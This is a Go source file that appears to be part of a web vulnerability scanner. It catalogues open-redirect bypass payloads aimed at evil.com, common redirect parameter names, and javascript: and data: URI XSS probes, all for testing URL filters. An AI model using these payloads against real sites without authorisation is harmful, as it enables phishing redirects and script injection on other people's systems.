// Package redirect provides Open Redirect payloads for various bypass techniques.
// Payloads are categorized by:
//   - Bypass type (Protocol-relative, authentication bypass, encoding)
//   - Target domain patterns
//   - URL parsing edge cases
package redirect

// BypassType represents the type of bypass technique used.
type BypassType string

const (
	// BypassNone is a direct external URL without bypass.
	BypassNone BypassType = "none"
	// BypassProtocolRelative uses protocol-relative URLs (//evil.com).
	BypassProtocolRelative BypassType = "protocol_relative"
	// BypassAuthSyntax uses URL authentication syntax (@).
	BypassAuthSyntax BypassType = "auth_syntax"
	// BypassEncoding uses URL encoding to bypass filters.
	BypassEncoding BypassType = "encoding"
	// BypassNullByte uses null byte injection.
	BypassNullByte BypassType = "null_byte"
	// BypassSlashManipulation uses slash-based bypasses.
	BypassSlashManipulation BypassType = "slash_manipulation"
	// BypassDomainConfusion uses domain parsing edge cases.
	BypassDomainConfusion BypassType = "domain_confusion"
	// BypassWhitespace uses whitespace characters for bypass.
	BypassWhitespace BypassType = "whitespace"
)

// Payload represents an Open Redirect payload.
type Payload struct {
	Value       string
	BypassType  BypassType
	Description string
	TargetParam bool // Whether this targets specific redirect parameters
}

// RedirectParams returns common redirect parameter names to test.
func RedirectParams() []string {
	return []string{
		"url",
		"redirect",
		"redirect_url",
		"redirect_uri",
		"next",
		"return",
		"return_url",
		"return_to",
		"returnTo",
		"goto",
		"go",
		"dest",
		"destination",
		"target",
		"link",
		"to",
		"out",
		"view",
		"continue",
		"continueTo",
		"forward",
		"redir",
		"ref",
		"reference",
		"callback",
		"callback_url",
		"success_url",
		"error_url",
		"cancel_url",
		"login_url",
		"logout_url",
		"image_url",
		"file",
		"path",
		"site",
		"domain",
	}
}

// GetPayloads returns all redirect payloads.
func GetPayloads() []Payload {
	return allPayloads
}

// GetBypassPayloads returns payloads with bypass techniques.
func GetBypassPayloads() []Payload {
	var result []Payload
	for _, p := range allPayloads {
		if p.BypassType != BypassNone {
			result = append(result, p)
		}
	}
	return result
}

// GetPayloadsByType returns payloads filtered by bypass type.
func GetPayloadsByType(bypassType BypassType) []Payload {
	var result []Payload
	for _, p := range allPayloads {
		if p.BypassType == bypassType {
			result = append(result, p)
		}
	}
	return result
}

// GeneratePayloadsForDomain creates payloads targeting a specific domain.
func GeneratePayloadsForDomain(trustedDomain, evilDomain string) []Payload {
	return []Payload{
		{
			Value:       evilDomain + "." + trustedDomain,
			BypassType:  BypassDomainConfusion,
			Description: "Subdomain of trusted domain",
		},
		{
			Value:       trustedDomain + "." + evilDomain,
			BypassType:  BypassDomainConfusion,
			Description: "Trusted as subdomain of evil",
		},
		{
			Value:       evilDomain + "%00" + trustedDomain,
			BypassType:  BypassNullByte,
			Description: "Null byte between domains",
		},
		{
			Value:       trustedDomain + "@" + evilDomain,
			BypassType:  BypassAuthSyntax,
			Description: "Auth syntax with trusted prefix",
		},
		{
			Value:       evilDomain + "%23" + trustedDomain,
			BypassType:  BypassEncoding,
			Description: "Fragment separator bypass",
		},
	}
}

// All redirect payloads.
// Source: PayloadsAllTheThings, HackTricks, PortSwigger
var allPayloads = []Payload{
	// Direct external URLs (no bypass)
	{Value: "https://evil.com", BypassType: BypassNone, Description: "Direct external HTTPS"},
	{Value: "http://evil.com", BypassType: BypassNone, Description: "Direct external HTTP"},
	{Value: "https://www.evil.com", BypassType: BypassNone, Description: "Direct with www"},
	{Value: "https://evil.com/", BypassType: BypassNone, Description: "Direct with trailing slash"},

	// Protocol-relative URLs
	{Value: "//evil.com", BypassType: BypassProtocolRelative, Description: "Protocol-relative URL"},
	{Value: "//evil.com/", BypassType: BypassProtocolRelative, Description: "Protocol-relative with slash"},
	{Value: "//evil.com/%2F..", BypassType: BypassProtocolRelative, Description: "Protocol-relative path traversal"},
	{Value: "////evil.com", BypassType: BypassProtocolRelative, Description: "Multiple slashes protocol-relative"},
	{Value: "/\\/evil.com", BypassType: BypassProtocolRelative, Description: "Mixed slashes bypass"},

	// Authentication syntax bypass (@)
	{Value: "https://trusted.com@evil.com", BypassType: BypassAuthSyntax, Description: "Auth syntax basic"},
	{Value: "https://trusted.com%40evil.com", BypassType: BypassAuthSyntax, Description: "Encoded @ symbol"},
	{Value: "//trusted.com@evil.com", BypassType: BypassAuthSyntax, Description: "Protocol-relative auth"},
	{Value: "https://trusted.com:password@evil.com", BypassType: BypassAuthSyntax, Description: "Full auth syntax"},
	{Value: "https://evil.com%23@trusted.com", BypassType: BypassAuthSyntax, Description: "Fragment with auth"},
	{Value: "https://evil.com?@trusted.com", BypassType: BypassAuthSyntax, Description: "Query with auth"},

	// URL encoding bypasses
	{Value: "https:%2F%2Fevil.com", BypassType: BypassEncoding, Description: "Encoded slashes"},
	{Value: "https:%252F%252Fevil.com", BypassType: BypassEncoding, Description: "Double encoded slashes"},
	{Value: "https://evil%2Ecom", BypassType: BypassEncoding, Description: "Encoded dot"},
	{Value: "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d", BypassType: BypassEncoding, Description: "Fully URL encoded"},
	{Value: "https://evil。com", BypassType: BypassEncoding, Description: "Unicode full stop"},
	{Value: "https://evil%E3%80%82com", BypassType: BypassEncoding, Description: "Encoded unicode dot"},

	// Null byte injection
	{Value: "https://evil.com%00trusted.com", BypassType: BypassNullByte, Description: "Null byte before trusted"},
	{Value: "https://evil.com%00.trusted.com", BypassType: BypassNullByte, Description: "Null byte with dot"},
	{Value: "//evil.com%00@trusted.com", BypassType: BypassNullByte, Description: "Null with auth syntax"},

	// Slash manipulation
	{Value: "///evil.com", BypassType: BypassSlashManipulation, Description: "Triple slash"},
	{Value: "\\/\\/evil.com", BypassType: BypassSlashManipulation, Description: "Backslash forward slash"},
	{Value: "/\\evil.com", BypassType: BypassSlashManipulation, Description: "Slash backslash"},
	{Value: "\\\\evil.com", BypassType: BypassSlashManipulation, Description: "Double backslash"},
	{Value: "//%5Cevil.com", BypassType: BypassSlashManipulation, Description: "Encoded backslash"},
	{Value: "/%09/evil.com", BypassType: BypassSlashManipulation, Description: "Tab between slashes"},
	{Value: "//%0Aevil.com", BypassType: BypassSlashManipulation, Description: "Newline after slashes"},

	// Domain confusion
	{Value: "https://evil.com#trusted.com", BypassType: BypassDomainConfusion, Description: "Fragment as trusted domain"},
	{Value: "https://evil.com?trusted.com", BypassType: BypassDomainConfusion, Description: "Query as trusted domain"},
	{Value: "https://evil.com\\trusted.com", BypassType: BypassDomainConfusion, Description: "Backslash domain separator"},
	{Value: "https://evil.com/trusted.com", BypassType: BypassDomainConfusion, Description: "Path as trusted domain"},
	{Value: "https://trusted.com.evil.com", BypassType: BypassDomainConfusion, Description: "Trusted as subdomain"},
	{Value: "https://trusted-com.evil.com", BypassType: BypassDomainConfusion, Description: "Trusted with hyphen"},
	{Value: "https://trustedcom.evil.com", BypassType: BypassDomainConfusion, Description: "Trusted without dot"},
	{Value: "https://eviltrusted.com", BypassType: BypassDomainConfusion, Description: "Concatenated domains"},

	// Whitespace bypass
	{Value: " https://evil.com", BypassType: BypassWhitespace, Description: "Leading space"},
	{Value: "https://evil.com ", BypassType: BypassWhitespace, Description: "Trailing space"},
	{Value: "\thttps://evil.com", BypassType: BypassWhitespace, Description: "Leading tab"},
	{Value: "https://evil.com\t", BypassType: BypassWhitespace, Description: "Trailing tab"},
	{Value: "\nhttps://evil.com", BypassType: BypassWhitespace, Description: "Leading newline"},
	{Value: "%20https://evil.com", BypassType: BypassWhitespace, Description: "Encoded leading space"},
	{Value: "%09https://evil.com", BypassType: BypassWhitespace, Description: "Encoded leading tab"},

	// JavaScript pseudo-protocol (for XSS via redirect)
	{Value: "javascript:alert(document.domain)", BypassType: BypassNone, Description: "JavaScript protocol"},
	{Value: "JaVaScRiPt:alert(1)", BypassType: BypassEncoding, Description: "Mixed case JavaScript"},
	{Value: "java%0d%0ascript:alert(1)", BypassType: BypassEncoding, Description: "CRLF in JavaScript"},

	// Data URI (for XSS via redirect)
	{Value: "data:text/html,<script>alert(1)</script>", BypassType: BypassNone, Description: "Data URI with script"},
	{Value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", BypassType: BypassEncoding, Description: "Base64 data URI"},
}
